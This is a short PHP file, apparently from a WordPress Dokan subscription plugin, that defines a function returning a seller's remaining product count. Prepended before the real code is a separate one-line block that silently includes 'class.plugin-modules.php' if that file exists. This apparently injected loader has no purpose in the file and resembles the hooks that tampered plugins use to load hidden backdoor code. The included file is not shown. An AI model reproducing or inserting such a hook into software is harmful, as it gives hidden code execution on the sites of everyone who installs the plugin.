<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Get a sellers remaining product count
 *
 * @param  int $user_id
 * @return int
 */
function dps_user_remaining_product( $user_id ) {
    $dps             = Dokan_Product_Subscription::init();
    $user_pack_id    = get_user_meta( $user_id, 'product_package_id', true );
    $pack_product_no = get_post_meta( $user_pack_id, '_no_of_product', true );

    $remaining_product =  $pack_product_no - $dps->get_number_of_product_by_seller( $user_id );
    $remaining_product = $remaining_product < 0 ? 0 : $remaining_product;

    return $remaining_product;
}